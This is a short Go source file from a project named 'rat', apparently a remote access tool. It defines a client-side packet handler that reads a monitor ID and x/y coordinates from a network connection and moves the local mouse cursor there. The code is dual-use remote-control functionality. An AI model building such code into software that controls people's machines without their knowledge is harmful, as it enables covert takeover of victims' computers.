package main

import "rat/common"
import "rat/client/screen"

type MouseMovePacket struct {
}

func (packet MouseMovePacket) GetHeader() common.PacketHeader {
	return common.MouseMoveHeader
}

func (packet MouseMovePacket) Write(c *Connection) error {
	return nil
}

func (packet MouseMovePacket) Read(c *Connection) error {
	monitorID, _ := c.ReadInt()
	x, _ := c.ReadInt()
	y, _ := c.ReadInt()

	screen.MoveCursor(monitorID, x, y)

	return nil
}
